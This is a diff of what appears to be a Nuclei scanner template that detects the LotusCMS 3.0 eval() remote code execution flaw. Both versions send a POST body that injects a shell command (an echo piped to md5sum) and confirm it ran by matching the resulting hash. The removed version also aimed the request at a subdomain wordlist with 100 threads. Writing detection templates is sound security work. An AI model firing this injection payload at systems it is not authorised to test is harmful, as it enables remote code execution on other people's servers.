@@ -1,34 +1,30 @@
-id: lotuscms-rce 1
+id: lotuscms-rce
+
 info:
-  author: pikpikcu
   name: LotusCMS 3.0 eval() RCE
-  reference: https://github.com/Hood3dRob1n/LotusCMS-Exploit
+  author: pikpikcu
   severity: critical
+  reference: https://github.com/Hood3dRob1n/LotusCMS-Exploit
   tags: lotuscms,rce
-requests:
-- attack: sniper
-  matchers:
-  - part: body
-    type: word
-    words:
-    - 38ee63071a04dc5e04ed22624c38e648
-  - status:
-    - 200
-    type: status
-  matchers-condition: and
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-  raw:
-  - 'POST /index.php HTTP/1.1
 
-    Host: {{Subdomains}}
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php"
+      - "{{BaseURL}}/lcms/index.php"
 
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      page=index');${system('echo lotuscms_rce | md5sum')};#
 
-    Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "38ee63071a04dc5e04ed22624c38e648"
+        part: body
 
-
-    page=index'');${system(''echo lotuscms_rce | md5sum'')};#
-
-    '
-  threads: 100
+      - type: status
+        status:
+          - 200
